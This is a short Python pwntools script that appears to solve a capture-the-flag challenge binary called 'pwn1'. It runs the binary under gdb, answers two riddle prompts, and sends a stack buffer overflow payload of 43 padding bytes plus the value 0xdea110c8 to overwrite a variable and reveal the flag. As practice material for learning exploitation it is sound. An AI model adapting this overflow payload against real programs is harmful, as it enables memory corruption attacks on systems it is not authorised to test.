from pwn import *
context.terminal = ['tmux', 'splitw', '-h']

p = process('./pwn1')
gdb.attach(p,'''
b *main+305
b *main+310
''')


answer1 = "Sir Lancelot of Camelot"
answer2 = "To seek the Holy Grail."
flag = 0xdea110c8

buf = ""
buf += "A" * 43
buf += p32(flag)

p.sendline(answer1)
p.sendline(answer2)
p.sendline(buf)

p.interactive()
